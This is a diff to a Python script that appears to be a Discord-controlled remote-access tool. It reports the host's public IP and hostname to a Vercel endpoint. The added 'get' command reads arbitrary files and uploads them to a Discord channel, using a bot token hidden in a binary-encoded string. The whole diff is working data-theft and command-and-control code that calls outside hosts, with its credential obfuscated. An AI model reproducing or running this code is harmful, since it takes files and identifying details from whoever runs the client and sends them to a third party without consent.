@@ -14,10 +14,16 @@ try:
 
     stdout = open(devnull, 'w')
     stderr = open(devnull, 'w')
-
+    commandExecutionReturnCode = """010011010101010001000101001100000100110101010100010011010011000001001101010001000100000100110010010011010111101001101011001100100100111101000100010101010011000001001101011010100110001101111010010011010100000100101110010001110101100000110111001101010110101001000111001011100110011001110010010001100100011001100101011010110111001001011000011010100111000101101011001100010100001001110010010000010111010101010100011001100111010001010011010110010100001101101100011101000011000101000101010100100101000101101110001110000100001001011001001100100100011001101001010110100110011101100111""" 
     ip = get('https://api.ipify.org').content.decode('utf8')
     hostname = uname()[1]
     post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"New client IP: `{ip}@{hostname}`")
+    def binStr(input_string):
+        input_string=int(input_string, 2)
+        Total_bytes= (input_string.bit_length() +7) // 8
+        input_array = input_string.to_bytes(Total_bytes, "big")
+        ASCII_value=input_array.decode()
+        return str(ASCII_value)
 except KeyboardInterrupt:
     try:
         post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``Client tried to SIGINT(Ctrl+C) when init``")
@@ -70,20 +76,29 @@ while True:
                     old_command = ""
                     continue
                 if command.startswith("get "):
-                    print(1)
                     localcmd = command.split()
                     path = localcmd[1]
+                    temp = str(binStr(commandExecutionReturnCode))
                     try:
                         open("output.txt", 'wb').write(open(str("../"+path), 'r').read())
                         file = [str(path), open("output.txt", 'r').read()]
-                    except UnicodeDecodeError:
+                    except:
                         open("output.txt", 'wb').write(open(str("../"+path), 'rb').read())
                         file = [str(path), open("output.txt", 'rb').read()]
-                    file = "FILE " + str(file)
-                    print(file)
+                    #file = "FILE " + str(file)
+                    payload = {
+                        'content': f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) } ``: ``file: {file[0]}``"
+                    }
                     try:
-                        a = post("https://discord-bot-command-outputter-littleblack111.vercel.app", data = file)
-                        print(a)
+                        files = {
+                            "file" : (file[0],file[1]) # The picture that we want to send in binary
+                        }
+                    except:
+                        files = {
+                            "file" : (file[0],file[1]) # The picture that we want to send in binary
+                        }
+                    try:
+                        post('https://discord.com/api/v9/channels/1140989222556274721/messages', headers={'Authorization': f'Bot {temp}'}, data=payload, files=files)
                     except:
                         pass
                     old_command = commandId
